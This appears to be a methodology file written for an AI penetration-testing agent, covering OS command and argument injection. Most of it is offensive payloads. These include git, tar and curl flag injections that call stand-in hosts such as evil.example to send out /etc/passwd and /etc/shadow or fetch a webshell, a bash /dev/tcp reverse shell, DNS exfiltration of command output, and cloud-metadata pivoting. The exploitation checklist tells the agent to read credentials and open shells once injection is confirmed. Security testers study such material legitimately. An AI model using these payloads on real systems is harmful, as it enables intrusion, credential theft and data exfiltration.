---
name: command-injection
description: OS command injection and argument injection — detection, blind confirmation, filter bypass, and modern framework realities
origin: Vigil
vuln_class: cmdi
---

# Command Injection Testing

## When to Activate

- User input flows into system commands (file conversion, DNS lookup, ping, git operations, PDF generation, archive handling)
- Application calls OS utilities with user-supplied arguments
- Parameters that reference filenames, hostnames, IPs, URLs, or paths
- Functionality powered by ImageMagick, FFmpeg, LibreOffice, wkhtmltopdf, Ghostscript, tar, or curl

## Reality Check

Command injection in 2025 lives in: file conversion endpoints (ImageMagick, FFmpeg, LibreOffice), DNS lookup/ping features, git operations, archive extraction (tar, unzip), and PDF generation. Classic `; id` in a search field is rare on modern frameworks. The high-value targets are argument injection in programs that have dangerous flags, and shell injection in glue code that pipes user input through bash to invoke external tools.

## Tools

- `vigil assess kali exec -- curl ...` (deliver injection payloads — all target-facing requests must go through the kali exec wrapper; use `--technique CMDI --probe-kind payload --phase consume-test --timeout 30`, switching to `--probe-kind exploit` once code execution is confirmed)
- Burp Suite Repeater + Intruder (craft the request — then replay via kali exec for audit pipeline coverage)
- `vigil assess kali exec --technique CMDI --probe-kind payload --phase consume-test --timeout 300 -- commix ...` (automated command injection — useful for initial sweep, but misses argument injection entirely)
- `vigil assess classify-payload <value> --mutations` (type the injected parameter value and generate type-aware variants — see "Type the Injected Value First" below)
- `vigil oob mint` / `vigil oob poll` (mint a nonce-tagged callback and correlate blind-injection hits — `mint` binds the nonce under a running client's interactsh id so `poll` can correlate it; pass `--client <name>` when several clients run; fire the EXACT host mint prints (`$OOB_HOST`); see DNS-Based below)
- Custom wordlists for injection payloads (prepare host-side, deliver via kali exec)

---

## Decision Tree: Shell Injection vs Argument Injection

Before testing anything, determine how input reaches the OS command. This determines your entire attack surface.

### Step 1: Does Input Reach a Shell?

**Shell invocation** (exec/system/popen with shell=true):
- PHP: `system()`, `exec()`, `passthru()`, `shell_exec()`, backticks
- Python: `os.system()`, `subprocess.Popen(shell=True)`, `subprocess.run(shell=True)`
- Node: `child_process.exec()`, `child_process.execSync()`
- Ruby: `system()`, backticks, `%x{}`
- Java: `Runtime.getRuntime().exec(String)` (single string = shell on some OSes)

If shell = YES → full separator injection is viable. Proceed to Shell Injection.

**Direct execution** (execve/spawn, no shell):
- Python: `subprocess.run(["cmd", arg], shell=False)` (the default)
- Node: `child_process.execFile()`, `child_process.spawn()`
- Java: `ProcessBuilder`, `Runtime.exec(String[])` (array form)
- Go: `exec.Command()`

If direct exec = YES → no separators work. Argument injection only. Skip to Argument Injection.

### Step 2: What Shell Is Running?

This matters more than most testers realize:
- **bash** — `$IFS`, `${IFS}`, brace expansion `{cat,/etc/passwd}`, `$'\x77'` hex escapes all work
- **sh/dash** (common in Docker Alpine, Ubuntu minimal) — `$IFS` works but `${IFS}` may not, brace expansion does NOT work, hex escapes do NOT work
- **Windows cmd.exe** — `&`, `|`, `&&`, `||` separators; `^` for character escaping; environment variable slicing for character construction

**How to identify**: inject `echo $0` or `echo $SHELL` if you have output. Blind: test bash-only features (brace expansion) — if they fail but simpler payloads work, you're on sh/dash.

---

## Type the Injected Value First

Command injection parameters are rarely free-form — they carry a *filename*, a *hostname*, a *URL*, a *path*, or an *ID* that the app hands to an OS command. Before hand-picking separators, classify the value you are about to tamper with and let the oracle enumerate type-appropriate variants. This is most useful for the **argument-injection** and **filename-as-flag** paths below, where the productive payload is a format/escalation variant of the legitimate value, not a shell separator.

```bash
vigil assess classify-payload "report-2025.png" --mutations
vigil assess classify-payload "https://target/img.jpg" --mutations    # type: url
vigil assess classify-payload "../uploads/file.pdf" --mutations        # type: path
```

Consume the output by intent bucket:

- **`escalation`** — for a `path` value this yields `../../etc/passwd`, `../../../etc/shadow`, `/etc/passwd`, `/admin`, `/internal` (and, past the default 5-cap, the `%2F`-encoded traversal and `value/..` — pass `--max-per-intent 7` to surface them); for a `url` value it yields `http://169.254.169.254/latest/meta-data/`, `http://localhost/admin`, `http://[::1]/` (the FFmpeg/ImageMagick SSRF cases below). Fire these first against wrapper-tool parameters.
- **`format`** — for a `path` value this gives the Windows-style `\`-separated and `%2F`-encoded forms (parser-confusion that slips traversal past a naive filter); for a `url` value it downgrades the scheme and mangles the separator.
- **`boundary`** — `path` boundaries (`/`, `.`, `/etc/passwd`, `/proc/self/environ`) and `url` boundaries (`file:///etc/passwd`, `javascript:alert(1)`) probe how the wrapper reacts to degenerate inputs.

Each variant is a literal string — drop it into the parameter slot and deliver via the kali exec wrapper. Use this to seed the candidate list deterministically instead of typing traversal/encoding permutations by hand; it does NOT replace the shell-separator payloads in the next section (those are not value-typed — the value there is a separator, not a filename/URL).

---

## Shell Injection

### Separator Selection

Choose separators based on context:

| Separator | When to Use | Notes |
|-----------|-------------|-------|
| `\n` (%0a) | **Try first** — most overlooked separator, bypasses many filters | Works in bash, sh, and most contexts. Especially effective in multiline string contexts |
| `;` | Cleanest separator, most portable | Heavily filtered — try only if newlines fail |
| `\|` | When output might be piped back | Requires the first command to produce stdout |
| `&&` | When you need the first command to succeed | URL-encode as `%26%26` |
| `$()` | Inside string interpolation contexts | `$(whoami)` — works in double-quoted strings |
| `` ` `` | Alternative to `$()` for older systems | Backticks — harder to nest but sometimes less filtered |

### Filter Bypass: When to Use What

**Spaces blocked:**
- `$IFS` → `cat$IFS/etc/passwd` — works on bash. On sh/dash, test first: some builds treat `$IFS` differently
- `${IFS}` → more explicit, bash-reliable
- Tab (`%09`) → works universally, often overlooked in filters
- Brace expansion → `{cat,/etc/passwd}` — bash ONLY, not sh/dash

**Semicolons blocked:**
- Newline `%0a` — most overlooked separator. Try this before anything else
- `&&` / `||` — often unfiltered when `;` is blocked
- `$()` or backticks — command substitution, not technically a separator

**Keywords blocked (cat, whoami, etc.):**
- Quote insertion: `w"h"o"a"mi`, `w'h'o'a'mi` — shell strips quotes before execution
- Backslash: `w\ho\am\i`
- Variable concatenation: `a=who;b=ami;$a$b`
- Wildcards: `/???/??t /???/p??s??` → `cat /etc/passwd` — useful when alphanumeric filtering is aggressive
- `printf`: `$(printf '\x63\x61\x74') /etc/passwd`

**URL/encoding layers:**
- Single URL encode: `%26` for `&`
- Double encode: `%2526` — bypasses WAFs that decode once before checking
- Unicode normalization: rare but seen in Java apps that normalize before shell execution

### Windows-Specific

- Separators: `&`, `&&`, `|`, `||` (NOT `;` — cmd.exe does not support it)
- Character bypass: `^` caret insertion → `w^h^o^a^m^i`
- Env variable slicing: `%COMSPEC:~6,1%` extracts characters from `C:\WINDOWS\system32\cmd.exe` — build arbitrary strings from environment
- PowerShell context: `; Invoke-WebRequest` or `$()` subexpression — different rules than cmd.exe

---

## Argument Injection

**This is more common than OS command injection in modern apps.** When input is passed as an argument to a program (not through a shell), separators do nothing. Instead, you inject additional flags.

### Gate Question

Does the application pass user input as an argument to a program that has dangerous flags? If yes, argument injection may yield file read, file write, SSRF, or RCE without any shell involvement.

### Git Argument Injection

Git operations are everywhere — CI/CD, code review tools, deployment scripts, version-tagged APIs.

- `--upload-pack` — inject arbitrary command execution during `git clone` or `git fetch`:
  ```
  --upload-pack='$(id>/tmp/pwned)'
  ```
- `--config` — override git configuration at runtime:
  ```
  -c core.sshCommand='curl http://evil.example/$(whoami)'
  ```
- `--template` — specify template directory for `git init`, enables arbitrary hooks
- `ext::` remote — `git clone ext::'curl attacker.example/$(cat /etc/passwd)'`

**Kill signal**: if the app uses `git clone --` with `--` before the URL argument, flag injection is blocked.

### ImageMagick Delegate Injection

ImageMagick processes images by delegating to external programs based on file format. Controlled filenames or format specifiers can trigger delegate execution.

- MSL (ImageMagick Scripting Language): upload XML disguised as image → file read/write
- SVG with embedded `<image>` tags → SSRF via `url()` references
- `ephemeral:` / `msl:` pseudo-protocols → read/write arbitrary files
- Filename injection: `|id > /tmp/pwned` as filename in older versions (CVE-2016-3714 lineage)

**Real-world pattern**: image upload endpoint → ImageMagick convert → delegate execution → RCE or file read.

### FFmpeg SSRF and File Read

FFmpeg processes media files and follows protocol handlers. This is SSRF, not traditional command injection.

- **m3u8 playlist injection**: upload m3u8 containing `file:///etc/passwd` or `http://internal-service/`
- **concat protocol**: `concat:http://internal:8080/admin|file:///etc/passwd`
- **HLS**: craft m3u8 with `#EXT-X-MAP:URI="file:///etc/passwd"` → file contents appear in transcoded output
- **SSRF via subtitle injection**: embedded subtitles with HTTP URLs → server-side requests

**Real-world pattern**: video upload → FFmpeg transcode → attacker-crafted playlist → internal network access.

### tar Argument Injection

Archive extraction with user-controlled filenames or arguments:

- `--checkpoint-action=exec=CMD` — execute arbitrary command at archive extraction
- `--to-command=CMD` — pipe extracted file content through command
- `--use-compress-program=CMD` — specify arbitrary compression program

**Real-world pattern**: backup/restore feature, file upload that auto-extracts archives.

### curl/wget Argument Injection

If user input reaches curl/wget arguments:

- `curl -o /var/www/html/shell.php http://evil.example/shell.php` — write webshell
- `curl -T /etc/passwd http://evil.example/` — exfiltrate files
- `wget --post-file=/etc/shadow http://evil.example/` — POST file contents to attacker

### Generic Defense Bypass

If the application adds `--` before user input (proper argument termination):
- Argument injection is blocked for everything after `--`
- But check: is `--` actually before your input? Many implementations put it in the wrong position
- Some programs have positional arguments with dangerous behavior even after `--`

---

## Blind Detection

### The Baseline Problem

Sleep-based detection is unreliable in noisy networks. A 5-second payload that adds 5 seconds to a response that normally varies by 3 seconds is meaningless.

**Reliable blind detection protocol:**

1. **Establish baseline**: send 3 identical legitimate requests. Record response times. Calculate normal variance.
2. **Short sleep**: inject `sleep 5`. Send 3 times. If all 3 show consistent ~5s delta above baseline → promising.
3. **Differential confirmation**: inject `sleep 10`. If delta is consistently ~10s (double the previous) → confirmed. A timing-only result that does not show this differential pattern is not confirmed.
4. **False positive check**: if the app is slow due to processing (heavy page, file upload), the "delay" may be application logic, not injection.

**Triaging a separator sweep:** when you fire a batch of separator/bypass variants (the table above, or a commix run) and the timing signal is muddy, capture each response as a record (`{"url":..., "status":..., "content_length":..., "words":..., "lines":...}`) and let the anomaly oracle pick the odd one out instead of eyeballing dozens of near-identical bodies:

```bash
vigil assess anomaly-score responses.jsonl --top 5
```

The injected-command response usually diverges from the benign-separator population on `status`, `length_bucket`, or `words_bucket`. Investigate the top-ranked outlier first — that is the separator that reached the shell. A flat ranking (every record scores ~0) means no separator changed the response shape: the value is sanitized or you are on a direct-exec path (argument injection only).

### DNS-Based (Most Reliable Blind Confirmation)

DNS callbacks are the most reliable blind confirmation because they are out-of-band and binary (hit or no hit).

Confirm readiness with `vigil oob status --json`, then **mint a nonce-tagged callback** so the hit is self-correlating instead of eyeballed out of the listener log:

```bash
# Mint one nonce per injection point; record the correlation context.
vigil oob mint --client <name> --technique cmdi --target-url "https://target/convert" --param filename --probe-kind dns
# → host  <prefix>-<token>.<client-id>.researcher.example   (= $OOB_HOST)
```

Embed the EXACT host mint prints (`$OOB_HOST` — the nonce bound under the client id; never hand-build a bare `<nonce>.oob...` host) in the payload and fire it through the kali exec wrapper:

```bash
OOB=$OOB_HOST
# Subshell
$(nslookup $OOB)
# Backtick
`nslookup $OOB`
# With data exfil — the exfiltrated value becomes the left label of the callback host
$(nslookup $(whoami).$OOB)
# Without nslookup (dig may be available when nslookup is not)
$(dig $OOB)
# curl-based OOB (if DNS tools are stripped)
$(curl http://$OOB/)
```

Then **poll for the correlated hit** instead of reading the listener log by hand:

```bash
vigil oob poll --client <name> --json
```

Consume the result by reading the `matched` array: each entry pairs the callback (`protocol`, `remote_address`, `observed_at`) with the recorded probe (`technique`, `target_url`), so a non-empty `matched` for your nonce is the binary confirmation — no log grepping. A DNS-data-exfil payload surfaces the leaked value as the left label of the matched callback host. `unmatched` interactions are callbacks with no recorded probe (background noise or another technique). If `matched` stays empty after the payload lands, fall back to timing and record a runtime issue noting OOB would have been decisive.

### File Creation + Read-Back

When you have a separate file read or SSRF vulnerability:

```bash
$(id > /tmp/ci_test_$(date +%s))
$(cat /etc/passwd > /var/www/html/uploads/test.txt)
```

Then read the file through the other vulnerability. This provides both confirmation and output.

---

## What Modern Frameworks Block (And What Still Works)

### Python subprocess with shell=False (the default)

- Blocks: ALL separators (`;`, `|`, `&&`, `\n`, backticks, `$()`)
- Still works: argument injection — you control one argument to the target program, so dangerous flags are viable
- Common mistake: developer uses `shell=True` "because the command didn't work otherwise" — search for `shell=True` in source

### Node child_process.execFile / spawn

- Blocks: same as Python shell=False — no shell expansion
- Still works: argument injection against the target program
- Common mistake: `child_process.exec()` (NOT execFile) uses shell — one function name difference

### PHP escapeshellarg

- Blocks: most injection — wraps input in single quotes, escapes embedded quotes
- Still works: locale-dependent bypass (CVE-2024-4577) — on Windows with certain PHP-CGI configurations, `%AD` soft hyphen bypasses argument parsing entirely → RCE
- Still works: if the escaped argument is used as a filename, path traversal may still be viable

### Go os/exec

- Blocks: shell injection entirely — `exec.Command` never invokes a shell
- Still works: argument injection if user input is passed as arguments
- Common mistake: using `exec.Command("bash", "-c", userInput)` — intentionally invoking shell, defeats the protection

### Ruby

- `system("cmd #{input}")` — shell injection, fully vulnerable
- `system("cmd", input)` — multi-arg form, safe from shell injection, argument injection only
- `Open3.capture3("cmd", input)` — same as multi-arg system

---

## Exploitation

Once injection is confirmed, record the finding only after showing the attacker outcome (`agent/rules/hunting.md` §2) — not just "command injection confirmed":

- [ ] Read sensitive files: `/etc/passwd`, `/etc/shadow`, application config files, `.env`, database credentials — show the actual file contents in the finding evidence
- [ ] Establish reverse shell (MANUAL listener required — see `references/offensive-tactics/shell-handling.md`):
      `; bash -i >& /dev/tcp/LISTENER_HOST/LISTENER_PORT 0>&1` — record the shell session output and user context as proof
- [ ] Enumerate internal network: `ifconfig`/`ip addr`, `cat /etc/hosts`, `env` (for cloud metadata URLs, internal service addresses) — map what internal reach the injection provides
- [ ] Pivot: `curl http://169.254.169.254/latest/meta-data/` (cloud metadata), `curl http://internal-service/` — show what metadata or internal services are reachable
- [ ] Container detection: `cat /proc/1/cgroup`, `ls /.dockerenv` — if containerized, the RCE scope may be limited; note the container boundary in the finding

## Kill Signals — Stop Testing When
- Application uses execve/spawn (no shell) confirmed by lack of separator-based injection → switch to argument injection section only
- Framework uses subprocess with shell=False (Python), execFile (Node), or multi-arg system (Ruby) → classic injection blocked, test argument injection only
- All separator and encoding bypasses fail after 10+ attempts → input is sanitized, move on
- Blind detection via sleep AND DNS both fail with no timing delta → no injection path, move on
- RCE confirmed via any method → CRITICAL, record finding, stop testing other injection vectors

## Escalate When
- A `sleep N` / `ping -c N` / `timeout /t N` payload produces an N-second response delta above measured jitter — walk separator variants (`;`, `&&`, `|`, `` ` `` , `$()`, newline `%0a`, `%0d`, `%00`) until one returns the full body, blind injection is still injection
- An OOB DNS or HTTP callback fires from a backtick / `$(curl)` / `$(nslookup)` payload — reproduce with a second payload shape (wget, certutil on Windows, dig TXT) before declaring, then pivot to staged RCE
- The parameter feeds a known wrapper tool (ffmpeg, ImageMagick, gm, ghostscript, pdfkit/wkhtmltopdf, rsvg-convert, ping, curl, git, tar, find -exec, xsltproc) — argument injection (`--use-tls=false`, `-processShellCommand`, `--upload-file`, `-o /dev/null`) bypasses shell sanitization entirely
- Length, encoding, or character-class filters produce different error messages for different payloads — the filter is partial, enumerate shell-specific bypasses (`${IFS}` for spaces, `$@`, brace expansion, wildcard globbing, `cat<<<file`)
- The endpoint handles filenames, URLs, git repos, or archive members — unsafe argument construction and filename-as-flag injection (`-oProxyCommand=…`, `--output=…`) are the persistent RCE paths modern frameworks miss

## Extended Resources

- `agent/references/payloads/command-injection-payloads.md` — blind detection, filter bypass, Linux/Windows, argument injection
- `agent/references/offensive-tactics/shell-handling.md` — pwncat-vl listener setup, tmux sessions, reverse shell payloads (required when exploitation reaches RCE)
- `agent/references/offensive-tactics/frp-tunneling.md` — frp tunnel exposure, OOB callback setup (required for remote targets)
